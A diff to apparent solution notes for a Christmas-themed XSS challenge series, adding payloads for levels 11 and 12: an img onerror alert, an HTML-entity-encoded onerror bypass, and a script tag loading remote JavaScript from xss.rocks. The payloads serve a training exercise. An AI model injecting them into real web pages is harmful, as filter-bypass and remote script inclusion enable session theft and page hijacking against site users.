@@ -77,16 +77,20 @@ https://xmass.compass-demo.com/level10
 **+++ Day 11 +++**  
 https://xmass.compass-demo.com/level11
 ```
-tbd
+<img src="#" Onerror="alert(1)"/>
 ```
 **+++ Day 12 +++**  
 https://xmass.compass-demo.com/level12
 ```
 <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
 ```
+alternatively one character reference would be enough
+```
+<img src="x" onerror="&#97;lert(1)">
+```
 alternative solution (no `alert(1)` but the script executes)
 ```
-<script src=https://xss.rocks/xss.js></script>
+<script src="https://xss.rocks/xss.js"></script>
 ```
 **+++ Day 13 +++**  
 https://xmass.compass-demo.com/level13
